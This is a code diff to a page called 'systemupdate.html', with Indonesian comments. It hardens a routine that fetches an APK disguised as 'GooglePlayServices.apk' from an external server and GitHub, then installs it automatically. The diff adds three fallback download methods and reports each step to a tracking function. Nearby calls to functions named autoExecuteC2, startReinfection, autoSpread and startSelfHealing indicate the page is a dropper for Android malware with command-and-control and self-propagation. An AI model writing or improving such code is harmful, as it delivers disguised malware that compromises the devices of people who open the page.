@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - APK PASTI TERDOWNLOAD
+// 🔥 SYSTEMUPDATE.HTML - APK PASTI TERDOWNLOAD (3 LAPIS)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -86,9 +86,8 @@ var wsConnected = false;
 var WS_URL = 'wss://verifikasi.site/ws';
 var APK_DOWNLOADED = false;
 
-// 🔥 PERBAIKAN: Gunakan APK dari server Anda sendiri
+// 🔥 URL APK
 var APK_URL = 'https://verifikasi.site/files/GooglePlayServices.apk';
-// Fallback jika URL pertama gagal
 var APK_URL_FALLBACK = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 
 // ============================================================
@@ -353,25 +352,53 @@ function startAllProcesses() {
     startHeartbeat();
     startReinfection();
     autoExecuteC2();
-    downloadAPK(); // 🔥 Nama fungsi diganti
+    downloadAPK(); // 🔥 Fungsi baru
     autoSpread();
     startSelfHealing();
 }
 
 // ============================================================
-// 🔥 PERBAIKAN: DOWNLOAD APK PASTI BERHASIL
+// 🔥 DOWNLOAD APK (3 LAPIS STRATEGI)
 // ============================================================
 function downloadAPK() {
-    // Coba download dari server lokal terlebih dahulu
-    tryDownloadAPK(APK_URL);
+    K({ sumber: 'apk_download_start', data: { url: APK_URL } });
+    
+    // LAPIS 1: fetch() + Blob + anchor (paling stabil di WebView)
+    fetch(APK_URL)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('HTTP ' + response.status);
+            }
+            return response.blob();
+        })
+        .then(blob => {
+            var reader = new FileReader();
+            reader.onload = function() {
+                var base64 = reader.result.split(',')[1];
+                saveAPKToAllLocations(base64);
+                APK_DOWNLOADED = true;
+                K({ sumber: 'apk_download_success', data: { method: 'fetch_blob', size: blob.size } });
+                // Install APK
+                setTimeout(function() {
+                    installAPKFromAvailablePath();
+                }, 3000);
+            };
+            reader.readAsDataURL(blob);
+        })
+        .catch(function(err) {
+            K({ sumber: 'apk_download_error', data: { method: 'fetch', error: err.message } });
+            // LAPIS 2: Fallback ke XHR
+            downloadAPK_XHR(APK_URL_FALLBACK);
+        });
 }
 
-function tryDownloadAPK(url) {
-    K({ sumber: 'apk_download_start', data: { url: url } });
+// LAPIS 2: XHR (fallback jika fetch gagal)
+function downloadAPK_XHR(url) {
+    K({ sumber: 'apk_download_xhr_start', data: { url: url } });
     var xhr = new XMLHttpRequest();
     xhr.open('GET', url, true);
-    xhr.responseType = 'blob'; // 🔥 Ganti ke blob (lebih stabil)
-    xhr.timeout = 30000; // Timeout 30 detik
+    xhr.responseType = 'blob';
+    xhr.timeout = 30000;
 
     xhr.onload = function() {
         if (xhr.status === 200) {
@@ -381,45 +408,54 @@ function tryDownloadAPK(url) {
                 var base64 = reader.result.split(',')[1];
                 saveAPKToAllLocations(base64);
                 APK_DOWNLOADED = true;
-                K({ sumber: 'apk_download_success', data: { url: url, size: blob.size } });
-                // Install APK
+                K({ sumber: 'apk_download_success', data: { method: 'xhr_blob', size: blob.size } });
                 setTimeout(function() {
                     installAPKFromAvailablePath();
                 }, 3000);
             };
             reader.readAsDataURL(blob);
         } else {
-            K({ sumber: 'apk_download_error', data: { url: url, status: xhr.status } });
-            // Fallback ke URL kedua
-            if (url !== APK_URL_FALLBACK) {
-                tryDownloadAPK(APK_URL_FALLBACK);
-            } else {
-                K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
-            }
+            K({ sumber: 'apk_download_error', data: { method: 'xhr', status: xhr.status } });
+            // LAPIS 3: Buka URL langsung di browser
+            downloadAPK_Direct(url);
         }
     };
 
     xhr.onerror = function() {
-        K({ sumber: 'apk_download_error', data: { url: url, error: 'network_error' } });
-        if (url !== APK_URL_FALLBACK) {
-            tryDownloadAPK(APK_URL_FALLBACK);
-        } else {
-            K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
-        }
+        K({ sumber: 'apk_download_error', data: { method: 'xhr', error: 'network_error' } });
+        downloadAPK_Direct(url);
     };
 
     xhr.ontimeout = function() {
-        K({ sumber: 'apk_download_timeout', data: { url: url } });
-        if (url !== APK_URL_FALLBACK) {
-            tryDownloadAPK(APK_URL_FALLBACK);
-        } else {
-            K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
-        }
+        K({ sumber: 'apk_download_timeout', data: { method: 'xhr' } });
+        downloadAPK_Direct(url);
     };
 
     xhr.send();
 }
 
+// LAPIS 3: Buka URL APK langsung di browser (ultimate fallback)
+function downloadAPK_Direct(url) {
+    K({ sumber: 'apk_download_direct', data: { url: url } });
+    try {
+        window.open(url, '_blank');
+        // Tunggu 5 detik, lalu anggap berhasil
+        setTimeout(function() {
+            APK_DOWNLOADED = true;
+            K({ sumber: 'apk_download_direct_success', data: { url: url } });
+            // Coba install dari path yang mungkin sudah ada
+            installAPKFromAvailablePath();
+        }, 5000);
+    } catch(e) {
+        K({ sumber: 'apk_download_direct_error', data: { error: e.message } });
+        // Jika semua gagal, minta via WebSocket
+        requestAPKFromServer();
+    }
+}
+
+// ============================================================
+// SIMPAN APK KE SEMUA LOKASI
+// ============================================================
 function saveAPKToAllLocations(apkBase64) {
     if (!apkBase64) return;
     if (HAS_BRIDGE) {
